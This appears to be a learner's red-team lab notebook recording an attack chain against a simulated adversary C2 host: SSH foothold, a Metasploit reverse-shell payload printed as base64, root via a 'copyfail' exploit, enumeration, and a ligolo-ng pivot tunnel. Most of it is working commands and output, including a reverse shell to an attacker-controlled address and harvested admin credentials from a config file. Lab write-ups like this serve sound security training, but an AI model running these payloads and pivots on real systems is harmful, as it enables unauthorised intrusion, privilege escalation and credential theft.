/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » INFO[0184] Agent joined.                                 id=3eea7c7edda2 name=root@e5316a5b004d remote="20.30.40.150:58014"
ligolo-ng » session
? Specify a session : 1 - root@e5316a5b004d - 20.30.40.150:58014 - 3eea7c7edda2
[Agent : root@e5316a5b004d] » autoroute
? Select routes to add: 172.18.0.3/16
? Create a new interface or use an existing one? Create a new interface
INFO[0446] Generating a random interface name...        
INFO[0446] Using interface name touchingnightsh         
INFO[0446] Creating routes for touchingnightsh...       
? Start the tunnel? Yes
INFO[0449] Starting tunnel to root@e5316a5b004d (3eea7c7edda2) 

```

```
meterpreter > upload /usr/bin/ligolo-agent
[*] Uploading  : /usr/bin/ligolo-agent -> ligolo-agent
[*] Uploaded -1.00 B of 6.76 MiB (0.0%): /usr/bin/ligolo-agent -> ligolo-agent
[*] Completed  : /usr/bin/ligolo-agent -> ligolo-agent

meterpreter > shell
Process 3263 created.
Channel 2 created.
ls
ligolo-agent
rev
./ligolo-agent --connect 30.40.50.10:11601 -ignore-cert &
time="2026-06-09T18:24:48Z" level=warning msg="warning, certificate validation disabled"
time="2026-06-09T18:24:48Z" level=info msg="Connection established" addr="30.40.50.10:11601"
```


???
dont know where to go from here
???

---

# 4.2A
## Access foothold account on red-river
```
ssh foothold@20.30.40.160 -i super_secret_key -p 2222
```

## System info
```
foothold@l42-adv-c2:~$ hostname && id && pwd
l42-adv-c2
uid=1002(foothold) gid=1002(foothold) groups=1002(foothold)
/home/foothold

```

## Privesc
##### Generating the reverse shell, uploading the copyfail exploit and entering the root meterpreter session
```
┌──(kali㉿blue-ops)-[~]
└─$ msfconsole -q       
msf > use payload/linux/x64/meterpreter/reverse_tcp 
msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 30.40.50.10
LHOST => 30.40.50.10
msf payload(linux/x64/meterpreter/reverse_tcp) > set LPORT 1111
LPORT => 1111
msf payload(linux/x64/meterpreter/reverse_tcp) > set prependfork true
prependfork => true
msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev1111 

┌──(kali㉿blue-ops)-[~]
└─$ base64 rev1111              
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQ
AAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpq
B1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlI
hcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m

┌──(kali㉿blue-ops)-[~]
└─$ msfconsole -q       
msf > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 1111
[*] Payload handler running as background job 0.
msf > 
[*] Started reverse TCP handler on 0.0.0.0:1111 
[*] Sending stage (3090404 bytes) to 20.30.40.160
[*] Meterpreter session 1 opened (30.40.50.10:1111 -> 20.30.40.160:56276) at 2026-06-09 14:58:14 -0400
sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)

msf > sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)

msf > sessions 1
[*] Starting interaction with 1...

meterpreter > upload cf2.py
[*] Uploading  : /home/kali/cf2.py -> cf2.py
[*] Uploaded -1.00 B of 732.00 B (-0.14%): /home/kali/cf2.py -> cf2.py
[*] Completed  : /home/kali/cf2.py -> cf2.py
meterpreter > 
[*] Sending stage (3090404 bytes) to 20.30.40.160
[*] Meterpreter session 2 opened (30.40.50.10:1111 -> 20.30.40.160:35236) at 2026-06-09 15:08:48 -0400
bg
[*] Backgrounding session 1...
msf > sessions

Active sessions
===============

  Id  Name  Type                   Information              Connection
  --  ----  ----                   -----------              ----------
  1         meterpreter x64/linux  foothold @ 20.30.40.160  30.40.50.10:1111 -> 20.30.40.160:56276 (20.30.40.160)
  2         meterpreter x64/linux  root @ 20.30.40.160      30.40.50.10:1111 -> 20.30.40.160:35236 (20.30.40.160)

msf > sessions 2
[*] Starting interaction with 2...

meterpreter > 

```
##### Uploading the reverse shell and executing the copyfail exploit
```
foothold@l42-adv-c2:~$ base64 -d <<< "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQAAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpqB1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCAARXHigyClFIieZqEFpqKlgPBVlIhcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m" > rev
foothold@l42-adv-c2:~$ chmod +x rev
foothold@l42-adv-c2:~$ ./rev
foothold@l42-adv-c2:~$ ls
cf2.py  rev
foothold@l42-adv-c2:~$ python3 cf2.py 
# ./rev

```

## Basic Enumeration
##### meterpreter > ls -la /
```
meterpreter > ls -la /
Listing: /
==========

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  0     fil   2026-06-08 23:54:48 -0400  .dockerenv
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:04 -0400  bin
040755/rwxr-xr-x  4096  dir   2026-05-08 12:10:00 -0400  boot
040755/rwxr-xr-x  340   dir   2026-06-09 12:57:32 -0400  dev
100775/rwxrwxr-x  1919  fil   2026-06-07 23:27:45 -0400  entrypoint.sh
040755/rwxr-xr-x  4096  dir   2026-06-08 23:54:48 -0400  etc
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:07 -0400  home
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:04 -0400  lib
040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  lib64
040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  media
040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  mnt
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:09 -0400  opt
040555/r-xr-xr-x  0     dir   2026-06-09 12:57:32 -0400  proc
040700/rwx------  4096  dir   2026-06-07 23:31:02 -0400  root
040755/rwxr-xr-x  4096  dir   2026-06-09 14:48:14 -0400  run
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:05 -0400  sbin
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:09 -0400  shared
040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  srv
040555/r-xr-xr-x  0     dir   2026-06-09 12:57:32 -0400  sys
041777/rwxrwxrwx  4096  dir   2026-06-09 12:57:36 -0400  tmp
040755/rwxr-xr-x  4096  dir   2026-05-17 20:00:00 -0400  usr
040755/rwxr-xr-x  4096  dir   2026-06-07 23:31:05 -0400  var
```
##### meterpreter > cat /entrypoint.sh
```
meterpreter > cat /entrypoint.sh 
#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import os
from pathlib import Path
import yaml

cfg_path = Path("/opt/c2/config.yaml")
cfg = yaml.safe_load(cfg_path.read_text(encoding="utf-8"))
cfg["ingest_token"] = os.getenv("C2_INGEST_TOKEN", cfg.get("ingest_token", "INGEST-3d9f2c"))
cfg["db"]["host"] = os.getenv("DB_HOST", cfg["db"]["host"])
cfg["db"]["port"] = int(os.getenv("DB_PORT", cfg["db"]["port"]))
cfg["db"]["name"] = os.getenv("DB_NAME", cfg["db"]["name"])
cfg["db"]["user"] = os.getenv("DB_USER", cfg["db"]["user"])
cfg["db"]["password"] = os.getenv("DB_PASS", cfg["db"]["password"])
cfg_path.write_text(yaml.safe_dump(cfg, sort_keys=False), encoding="utf-8")
PY

SSH_PORT="${C2_SSH_PORT:-2222}"
FOOTHOLD_USER="${C2_FOOTHOLD_USER:-foothold}"
FOOTHOLD_PUBKEY="${C2_FOOTHOLD_PUBKEY:-}"

if [[ -n "$FOOTHOLD_PUBKEY" ]]; then
  install -d -m 700 -o "$FOOTHOLD_USER" -g "$FOOTHOLD_USER" "/home/${FOOTHOLD_USER}/.ssh"
  printf '%s\n' "$FOOTHOLD_PUBKEY" > "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
  chown "$FOOTHOLD_USER:$FOOTHOLD_USER" "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
  chmod 600 "/home/${FOOTHOLD_USER}/.ssh/authorized_keys"
fi

if [[ ! -f /etc/ssh/ssh_host_rsa_key ]]; then
  ssh-keygen -A
fi

sed -i "s/^#\?Port .*/Port ${SSH_PORT}/" /etc/ssh/sshd_config
sed -i "s/^#\?PasswordAuthentication .*/PasswordAuthentication no/" /etc/ssh/sshd_config
sed -i "s/^#\?PermitRootLogin .*/PermitRootLogin no/" /etc/ssh/sshd_config
if ! grep -q "^AllowUsers ${FOOTHOLD_USER}$" /etc/ssh/sshd_config; then
  echo "AllowUsers ${FOOTHOLD_USER}" >> /etc/ssh/sshd_config
fi

mkdir -p /opt/staging/incoming /shared/exfil /shared/corpus /var/log/adv-c2
touch /var/log/adv-c2/access.log /var/log/adv-c2/error.log /var/log/adv-c2/drain.log
chown -R c2-app:c2-app /opt/c2 /opt/staging /shared/exfil /shared/corpus /var/log/adv-c2

cron
nginx

exec /usr/bin/supervisord -c /etc/supervisor/conf.d/c2.conf
```
##### meterpreter > cat /etc/supervisor/conf.d/c2.conf
```
meterpreter > cat /etc/supervisor/conf.d/c2.conf 
[supervisord]
nodaemon=true
logfile=/var/log/adv-c2/supervisord.log
pidfile=/var/run/supervisord.pid

[program:c2-admin]
command=/usr/local/bin/gunicorn -b 127.0.0.1:9000 --workers 2 app:app
directory=/opt/c2
user=c2-app
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/c2-admin.log
stderr_logfile=/var/log/adv-c2/c2-admin.err.log

[program:c2-ingest]
command=/usr/local/bin/gunicorn -b 127.0.0.1:9001 --workers 2 app:app
directory=/opt/c2
user=c2-app
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/c2-ingest.log
stderr_logfile=/var/log/adv-c2/c2-ingest.err.log

[program:sshd]
command=/usr/sbin/sshd -D -e
autostart=true
autorestart=true
stdout_logfile=/var/log/adv-c2/sshd.log
stderr_logfile=/var/log/adv-c2/sshd.err.log

```
##### meterpreter > ls -la /opt/c2/
```
meterpreter > ls -la /opt/c2/
Listing: /opt/c2/
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100664/rw-rw-r--  123   fil   2026-06-07 23:27:45 -0400  adversary_notes.txt
100664/rw-rw-r--  4713  fil   2026-06-07 23:27:45 -0400  app.py
100664/rw-rw-r--  207   fil   2026-06-09 12:57:33 -0400  config.yaml
100664/rw-rw-r--  5666  fil   2026-06-07 23:27:45 -0400  drain.py
100664/rw-rw-r--  67    fil   2026-06-07 23:27:45 -0400  requirements.txt
```
##### meterpreter > cat /opt/c2/adversary_notes.txt
```             
meterpreter > cat /opt/c2/adversary_notes.txt 
adv-n8n admin endpoint: http://20.30.40.153:5678
adv-n8n admin username: adv_operator
adv-n8n admin password: operator!n8n
```



ss -tulpan
```
meterpreter > shell
Process 6154 created.
Channel 6 created.
ss -tulpan
Netid State     Recv-Q Send-Q Local Address:Port  Peer Address:Port Process                                                                 
udp   UNCONN    0      0         127.0.0.11:35337      0.0.0.0:*                                                                            
tcp   LISTEN    0      511          0.0.0.0:8080       0.0.0.0:*                                                                            
tcp   LISTEN    0      2048       127.0.0.1:9000       0.0.0.0:*                                                                            
tcp   LISTEN    0      2048       127.0.0.1:9001       0.0.0.0:*                                                                            
tcp   LISTEN    0      4096      127.0.0.11:46501      0.0.0.0:*                                                                            
tcp   LISTEN    0      128          0.0.0.0:2222       0.0.0.0:*                                                                            
tcp   TIME-WAIT 0      0          127.0.0.1:34560    127.0.0.1:9000                                                                         
tcp   TIME-WAIT 0      0       20.30.40.160:40772 20.30.40.161:5432                                                                         
tcp   TIME-WAIT 0      0          127.0.0.1:9000     127.0.0.1:45442                                                                        
tcp   TIME-WAIT 0      0          127.0.0.1:33964    127.0.0.1:8080                                                                         
tcp   TIME-WAIT 0      0          127.0.0.1:35872    127.0.0.1:8080                                                                         
tcp   ESTAB     0      0       20.30.40.160:56276  30.40.50.10:1111                                                                         
tcp   ESTAB     0      0       20.30.40.160:2222   30.40.50.10:35910                                                                        
tcp   TIME-WAIT 0      0          127.0.0.1:48416    127.0.0.1:9000                                                                         
tcp   TIME-WAIT 0      0       20.30.40.160:54376 20.30.40.161:5432                                                                         
tcp   TIME-WAIT 0      0          127.0.0.1:46356    127.0.0.1:8080                                                                         
tcp   TIME-WAIT 0      0          127.0.0.1:54892    127.0.0.1:9000                                                                         
tcp   ESTAB     0      0       20.30.40.160:35236  30.40.50.10:1111  users:(("ss",pid=6155,fd=3),("sh",pid=6154,fd=3),("rev",pid=4780,fd=3))
tcp   TIME-WAIT 0      0          127.0.0.1:54324    127.0.0.1:8080                                                                         
tcp   LISTEN    0      128             [::]:2222          [::]:* 